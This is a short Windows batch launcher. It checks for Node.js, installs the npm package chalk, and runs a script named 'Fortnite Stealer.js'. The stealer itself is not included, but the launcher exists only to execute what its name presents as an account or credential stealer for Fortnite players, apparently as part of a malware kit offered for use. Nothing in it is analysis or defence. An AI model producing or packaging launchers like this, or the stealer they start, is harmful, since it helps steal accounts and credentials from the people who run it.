@echo off
node -v >nul 2>&1
if errorlevel 1 (
    echo Node.js is not installed. Please install it from https://nodejs.org/.
    pause
    exit /b
)

npm install chalk
if errorlevel 1 (
    echo Failed to install chalk. Check your npm setup.
)

node "Fortnite Stealer.js"
if errorlevel 1 (
    echo Script execution failed. Check your code for errors.
)

pause
